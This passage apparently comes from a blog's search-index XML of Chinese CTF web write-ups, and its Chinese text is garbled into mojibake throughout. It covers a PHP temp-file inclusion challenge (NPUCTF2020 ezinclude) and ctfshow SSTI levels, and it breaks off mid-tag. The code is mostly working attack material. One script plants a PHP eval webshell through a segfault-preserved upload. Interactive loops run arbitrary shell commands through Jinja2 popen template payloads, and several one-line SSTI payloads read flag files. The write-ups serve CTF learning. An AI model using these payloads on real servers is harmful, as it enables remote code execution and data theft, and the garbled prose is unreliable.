‡ğŸ„&quot;</span><br><span class="line">å¤„ç†ç»“æœï¼š</span><br><span class="line">NSSCTF&#123;88dd8af0-3efe-4d6c-9d92-f2a1fb25b72a&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ‰å°è€ƒç‚¹çš„Webé¢˜</title>
      <link href="/posts/b3ad4123.html"/>
      <url>/posts/b3ad4123.html</url>
      
        <content type="html"><![CDATA[<h1 id="buuoj-npuctf2020ezinclude-1"><a class="markdownIt-Anchor" href="#buuoj-npuctf2020ezinclude-1">#</a> BUUOJ-[NPUCTF2020]ezinclude 1</h1><h2 id="æ¶‰åŠçš„çŸ¥è¯†ç‚¹"><a class="markdownIt-Anchor" href="#æ¶‰åŠçš„çŸ¥è¯†ç‚¹">#</a> æ¶‰åŠçš„çŸ¥è¯†ç‚¹</h2><ul><li>æ–‡ä»¶ä¸Šä¼ æ—¶çš„ä¸´æ—¶æ–‡ä»¶</li><li>php7 æ–‡ä»¶ä¸Šä¼ æ—¶  <code>Segment Fault</code> ï¼Œä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤</li><li>ç»•è¿‡ <code>disable_functions</code></li></ul><h2 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹">#</a> è§£é¢˜è¿‡ç¨‹</h2><p>â€‹æ‰«ä¸ªç›®å½•ï¼Œå­˜åœ¨ <code>index.php</code> ã€ <code>dir.php</code> ã€ <code>404.html</code></p><p>â€‹ <code>404.html</code>  æ²¡å•¥ç”¨ï¼Œå…ˆçœ‹ <code>dir.php</code> ï¼Œå¥½åƒè·å–ç›®å½•å†…æ–‡ä»¶çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåœ°æ–¹çš„ï¼Œä¹‹åçœ‹çœ‹ã€‚</p><p>â€‹ <code>index.php</code>  æŠ“ä¸ªåŒ…ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:20:37 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>73</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a; expires=Mon, 08-Dec-2025 06:20:37 GMT; Max-Age=3600000</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">username/password<span class="built_in"> error</span><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xquery"></span></span><br></pre></td></tr></table></figure><p>â€‹çœ‹åˆ° <code>&lt;!--md5($secret.$name)===$pass --&gt;</code>  æç¤º</p><blockquote><ul><li><code>Set-Cookie</code>  ä¸­çš„ <code>Hash</code>  å°±æ˜¯ <code>$md5($secret.$name)</code> ï¼ˆç»å…¸è„‘æ´ï¼‰</li><li>å¦‚æœ <code>$name=''</code> ï¼Œåˆ™æœ‰ <code>$md5($secret.$name)===$md5($secret)===ä¸Šé¢çš„Hash</code></li><li>åˆ™ <code>/?pass=ä¸Šé¢çš„Hash</code>  å³å¯ï¼Œæˆ–è€…å¸¦ä¸Š <code>&amp;name=</code>  ä¼ é€’ç©ºå€¼</li></ul></blockquote><p>â€‹è¿™é‡Œæ˜¯ä¸ªè„‘æ´ï¼Œä¸çŸ¥é“æ€ä¹ˆå†™ï¼Œå¤§ç¥çš„åšå®¢é‡Œçš„è§£æ³•æ˜¯è¿™æ ·çš„ï¼Œä¹‹åè®¿é—® get ä¼ å‚ pass ä¸º hash çš„å€¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?pass=fa25e54758d5d5c1927781a6ede89f8a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ab02601-d4bd-4e33-94da-895a0ac553e6.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¾—åˆ°å›æ˜¾ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:23:02 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>165</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;flflflflag.php&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>â€‹è®¿é—® <code>flflflflag.php</code> ï¼Œä¼š 302ï¼Œbutp é‡æ”¾ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:24:50 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>241</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">include($_GET[&quot;file&quot;])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>â€‹æç¤ºæ–‡ä»¶åŒ…å«ï¼Œè¯»ä¸‹ç›¸å…³æ–‡ä»¶ <code>index.php</code> ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_Ã¥Â‡ÂºÃ©Â¢Â˜Ã¤ÂºÂº_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$file=$_GET[&#x27;file&#x27;];</span></span><br><span class="line"><span class="meta">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span></span><br><span class="line"><span class="meta">die(&#x27;nonono&#x27;);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">@include($file);</span></span><br><span class="line"><span class="meta">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹å‘ç° dataï¼Œinputï¼Œzip ä¸‰ä¸ªä¼ªåè®®è¢«æ¨äº†ã€‚</p><p>â€‹è¯»ä¸€ä¸‹ <code>dir.php</code> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æ˜¯è¯»å–çš„ä¸´æ—¶æ–‡ä»¶ï¼Œä¹‹å‰è¯´è¿‡äº†ï¼Œ</p><blockquote><p>php7 æ–‡ä»¶ä¸Šä¼ æ—¶  <code>Segment Fault</code> ï¼Œä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤</p><p><strong>è¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªç‰¹æ€§</strong>ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œå¦‚æœå‡ºç° <code>Segment Fault</code> ï¼Œé‚£ä¹ˆä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚è¿™é‡Œçš„ä¸Šä¼ æ–‡ä»¶éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œä¸€èˆ¬è®¤ä¸ºï¼Œä¸Šä¼ æ–‡ä»¶éœ€è¦å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼Œä½†å®é™…ä¸Šï¼Œæ— è®ºæ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œåªè¦ HTTP è¯·æ±‚ä¸­å­˜åœ¨æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±ä¼šè¢«ä¿å­˜ä¸ºä¸´æ—¶æ–‡ä»¶ï¼Œå½“å‰ HTTP è¯·æ±‚å¤„ç†å®Œæˆåï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¼šè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ä½¿ <code>php</code>  é™·å…¥æ­»å¾ªç¯ç›´ï¼Œäº§ç”Ÿ <code>Segment Fault</code>  çš„æ–¹æ³•ï¼šï¼ˆå…·ä½“åŸç†æœªæ‰¾åˆ°ï¼Œå¦‚æœæœ‰å¤§ä½¬æ¸…æ¥šï¼Œè¯·å‘ŠçŸ¥ï¼Œæ„Ÿè°¢ã€‚ï¼‰</p><ul><li>ä½¿ç”¨</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=æ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li><p>ç‰ˆæœ¬è¦æ±‚ï¼š</p><ul><li><code>php7.0.0-7.1.2</code></li><li><code>php7.1.3-7.2.1</code></li><li><code>php7.2.2-7.2.8</code></li></ul></li><li><p>ä½¿ç”¨</p></li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=æ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li>ç‰ˆæœ¬è¦æ±‚ï¼š<ul><li><code>php&lt;=5.6.38</code></li><li><code>php7.0.0-7.0.32</code></li><li><code>php7.0.4-7.2.12</code></li></ul></li><li>å‡½æ•°è¦æ±‚<ul><li><code>file</code></li><li><code>file_get_contents</code></li><li><code>readfile</code></li></ul></li></ul></blockquote><p>â€‹è¿™ä¸ªæ—¶å€™ç›´æ¥ç”¨ä¸‹é¢è¿™ä¸ªä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f5a7ab3-e7a9-44aa-82ec-fc6ee05919ff.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">file_data = &#123;<span class="string">&quot;file&quot;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">res = requests.post(url=url,files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><blockquote><ul><li>å­˜å‚¨è·¯å¾„ï¼Œç”±</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.ini</span><br></pre></td></tr></table></figure><p>ä¸­çš„</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_tmp_dir</span><br></pre></td></tr></table></figure><p>æŒ‡å®šï¼Œ</p><ul><li><p>linux ä¸‹é»˜è®¤å€¼ <code>/tmp/</code></p></li><li><p>windwos ä¸‹é»˜è®¤å€¼ <code>C:/Windwos</code>  or  <code>C:/Windwos/Temp/</code></p></li><li><p>å‘½åè§„åˆ™</p></li><li><p>linux ä¸‹ï¼Œ <code>php+6ä¸ªéšæœºå­—ç¬¦</code></p></li><li><p>windows ä¸‹ï¼Œ <code>php+4ä¸ªéšæœºå­—ç¬¦.tmp</code></p></li><li><p>ç”Ÿå‘½å‘¨æœŸ</p></li><li><p>å¼€å§‹å¤„ç†å¸¦æœ‰æ–‡ä»¶çš„ <code>POST</code>  è¯·æ±‚</p></li><li><p>ä¿å­˜ä¸´æ—¶æ–‡ä»¶ï¼Œå¹¶å†™å…¥æ•°æ®</p></li><li><p>æ‰§è¡Œ <code>php</code>  è„šæœ¬</p></li><li><p>åˆ é™¤ä¸´æ—¶æ–‡ä»¶</p></li></ul></blockquote><p>â€‹è¿™é‡Œå¯ä»¥ç›´æ¥è®¿é—® <code>dir.php</code>  è·å¾—æ–‡ä»¶åã€‚</p><p>â€‹ä¹‹åé€šè¿‡ flflflflag.php è¿›è¡Œä¸´æ—¶æ–‡ä»¶åŒ…å«å³å¯ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flflflflag.php?file=../../../tmp/php7nXFiI</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ab02601-d4bd-4e33-94da-895a0ac553e6.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>14</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">cmd</span><span class="operator">=</span>phpinfo()<span class="comment">;</span></span></span><br></pre></td></tr></table></figure><p>â€‹flag åœ¨ phpinfo é‡Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-SSTI</title>
      <link href="/posts/4826d2ce.html"/>
      <url>/posts/4826d2ce.html</url>
      
        <content type="html"><![CDATA[<h1 id="web361"><a class="markdownIt-Anchor" href="#web361">#</a> web361ï¼š</h1><p>â€‹name ä¼ å‚ï¼Œç›´æ¥å¹²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_wrap</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">        url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        resp = get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><p>â€‹<strong>è¡¥å……ï¼šå‡ ç§æ‰‹æ³•</strong></p><blockquote><ul><li>æ‰‹æ³•ä¸€ï¼špayload os.warp_close ç±» çš„ popen æ–¹æ³•</li><li>?name= <code>&#123;&#123;"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;</code></li><li>æ‰‹æ³•äºŒï¼š åˆ©ç”¨ configï¼š</li><li>?name= <code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() &#125;&#125;</code></li><li>æ‰‹æ³•ä¸‰ï¼š <code>lipsum.__globals__</code> å«æœ‰ os æ¨¡å—ï¼š</li><li>?name= <code>&#123;&#123;lipsum.__globals__['os'].popen('tac ../flag').read()&#125;&#125;</code></li><li>æ‰‹æ³•ä¸‰ï¼šåˆ©ç”¨ <code>__builtins__</code></li><li>?name= <code>&#123;&#123;url_for.__globals__['__builtins__']['eval'](__import__('os').popen('cat /flag').read()&#125;&#125;</code></li><li>?name= <code>&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></li></ul></blockquote><h1 id="web362"><a class="markdownIt-Anchor" href="#web362">#</a> web362ï¼š</h1><p>â€‹è¿‡æ»¤äº†æ•°å­— 2ï¼Œ3ï¼Œä¸Šæ²¡æœ‰æ•°å­—çš„ payload å°±è¡Œäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://059cc139-d7d5-4369-86b1-0f3cf98b114c.challenge.ctf.show/?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read() &#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><p>â€‹å¦å¤–çš„ payloadï¼š</p><ul><li><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swigï¿¼<span class="token number">26</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swigï¿¼<span class="token number">27</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#å…ˆåˆ©ç”¨ join å’Œ count è¿‡æ»¤å™¨å¾—åˆ°æ•°å­— 2ï¼Œç„¶åå†ç”¨ 66*2 å»å¾—åˆ° 132</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>codeï¿¼<span class="token number">2</span><span class="token operator">-</span><span class="token operator">-</span><span class="token 